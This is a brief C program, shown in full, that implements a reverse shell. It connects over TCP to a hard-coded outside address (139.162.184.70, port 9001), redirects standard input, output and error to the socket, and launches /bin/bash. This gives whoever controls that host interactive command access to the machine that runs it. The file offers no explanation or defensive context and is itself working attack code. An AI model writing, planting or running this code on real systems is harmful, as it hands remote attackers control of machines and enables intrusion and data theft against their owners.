#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in target;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    target.sin_family = AF_INET;
    target.sin_port = htons(9001);
    target.sin_addr.s_addr = inet_addr("139.162.184.70");

    connect(sock, (struct sockaddr *)&target, sizeof(target));

    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr

    char * const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;
}
